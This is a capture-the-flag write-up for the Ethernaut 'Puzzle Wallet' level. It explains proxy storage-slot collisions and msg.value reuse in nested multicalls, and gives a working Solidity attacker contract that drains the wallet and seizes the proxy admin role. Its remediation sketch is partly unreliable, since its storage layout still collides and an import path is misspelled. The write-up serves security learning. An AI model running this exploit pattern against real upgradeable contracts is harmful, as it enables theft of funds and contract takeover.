---
title: 'Ethernaut - Puzzle Wallet'
description: 'Mastering proxy patterns, storage layout collisions, and msg.value reuse inside multicalls. Learn how to hijack proxy administration by bypassing whitelists and exploiting delegatecall execution flows.'
date: 2025-07-24
tags: ['solidity', 'security', 'proxy', 'delegatecall', 'multicall', 'storage-collision', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🧩 Puzzle Wallet - The Proxy & Multicall Heist

## Challenge Overview

In this level, we are faced with an upgradeable wallet contract (`PuzzleWallet`) wrapped in a proxy contract (`PuzzleProxy`). 

To beat the level, our objective is to **hijack the proxy's administrative role** to become the new `admin` of the `PuzzleProxy`.

**The Catch:** The proxy admin variable is located in the proxy's storage and is only modifiable by the proxy admin themselves. We must discover how storage collisions between proxy/implementation contracts and `delegatecall` state changes can allow us to overwrite administrative variables.

---

## Technical Analysis

### Vulnerability 1: Storage Slot Collision between Proxy and Implementation

Upgradeable proxies use `delegatecall` to forward transactions to an implementation logic contract. In Solidity, storage is mapped slot-by-slot:
*   **`PuzzleProxy` Storage Layout**:
    *   Slot 0: `pendingAdmin`
    *   Slot 1: `admin`
*   **`PuzzleWallet` Storage Layout**:
    *   Slot 0: `owner`
    *   Slot 1: `maxBalance`
    *   Slot 2: `whitelisted` mapping
    *   Slot 3: `balances` mapping

Because storage slot 0 maps to both `pendingAdmin` (proxy) and `owner` (wallet), any modification to `pendingAdmin` inside the proxy context will **overwrite** the `owner` variable in the wallet context, and vice versa!

Similarly, slot 1 maps to both `admin` (proxy) and `maxBalance` (wallet). Overwriting `maxBalance` will instantly overwrite `admin`!

### Vulnerability 2: `msg.value` Reuse in Nested `multicall` Loop

The `PuzzleWallet` contract implements a `multicall` function to batch transaction calls:

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        // ...
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            depositCalled = true;
        }
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

While the contract attempts to prevent `deposit` from being called multiple times using the `depositCalled` boolean flag, it is vulnerable to a nested call bypass:
1. `msg.value` remains constant during the entire duration of the transaction execution context.
2. If we call `multicall` containing a regular `deposit` call, and a *nested* `multicall` call that executes `deposit`, the flag `depositCalled` in the local loop is reset, but the transaction still carries the same `msg.value`!
3. This allows us to deposit `0.001 ETH` once but credit our internal contract balance twice (or more), making the contract believe we have deposited `0.002 ETH`!

---

## The Exploit: The Multi-Step Heist

To hijack the proxy admin, we execute a multi-phase attack:
1. **Takeover Implementation Owner**: Call `proposeNewAdmin(player)` on the proxy. Due to the slot 0 storage collision, this overwrites `owner` in the implementation storage with our address!
2. **Whitelist Ourselves**: Since we are now the `owner`, call `addToWhitelist(player)` to grant ourselves whitelisted access.
3. **Exploit Multicall for Free Credit**:
   * Build a `multicall` payload where the first element is a call to `deposit()`.
   * The second element is a call to `multicall()` which itself contains a nested call to `deposit()`.
   * Call `multicall` sending exactly `0.001 ETH`. Our balance in `PuzzleWallet` is now credited as `0.002 ETH`, while the contract's actual balance only increased by `0.001 ETH`.
4. **Drain the Wallet**: Call `execute()` to withdraw `0.002 ETH` (draining the contract's actual balance to 0).
5. **Overstrike Admin (Slot 1)**: Now that the actual balance is 0, we can successfully call `setMaxBalance(uint256(uint160(player)))`. Because of the slot 1 storage collision, this overwrites the `admin` slot of the proxy with our player address!

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract that automates the heist:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletAttacker {
    constructor(address payable _target) payable {
        IPuzzleWallet wallet = IPuzzleWallet(_target);

        // 1. Propose new admin on proxy (overwrites implementation owner)
        wallet.proposeNewAdmin(address(this));

        // 2. Whitelist ourselves
        wallet.addToWhitelist(address(this));

        // 3. Craft nested multicall to exploit msg.value reuse
        bytes[] memory depositPayload = new bytes[](1);
        depositPayload[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory mainPayload = new bytes[](2);
        mainPayload[0] = depositPayload[0]; // First deposit
        mainPayload[1] = abi.encodeWithSelector(wallet.multicall.selector, depositPayload); // Nested deposit

        // Execute batch transaction sending 0.001 ETH
        wallet.multicall{value: 0.001 ether}(mainPayload);

        // 4. Drain the wallet (withdraw 0.002 ETH)
        wallet.execute(msg.sender, 0.002 ether, "");

        // 5. Set max balance (overwrites proxy admin)
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        // Verify takeover succeeded
        require(wallet.admin() == msg.sender, "Hack failed!");
    }
}
```

---

## Auditor's Lessons

1. **Avoid Unaligned Proxy Storage**: When building upgradeable smart contracts, never declare variables sequentially without matching the proxy's storage alignment. Use structured storage patterns (like EIP-1967) to store proxy parameters in random slots (e.g., `keccak256("eip1967.proxy.admin") - 1`) to eliminate collisions.
2. **`msg.value` inside Loops/Multicalls**: Never trust `msg.value` inside loops or `delegatecall` batched iterations. If batching operations, enforce strict accounting checks or convert `msg.value` into a WETH credit system first.
3. **Audit Whitelist Controls**: Restrict critical admin initialization functions to prevent post-deployment hijacking.

---

## Remediation

Refactor `PuzzleWallet` and its proxy to use aligned, structured storage mappings, and secure `multicall` from executing nested payable methods:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradable/proxy/utils/Initializable.sol";

contract SecurePuzzleWallet is Initializable {
    // Standard structured upgrades
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function initialize() external initializer {
        owner = msg.sender;
    }

    // Fix: Block nested multicalls by tracking execution depth
    bool private isExecutingMulticall;

    function multicall(bytes[] calldata data) external payable {
        require(!isExecutingMulticall, "Re-entrancy in multicall blocked");
        isExecutingMulticall = true;
        
        // Loop execution...

        isExecutingMulticall = false;
    }
}
```
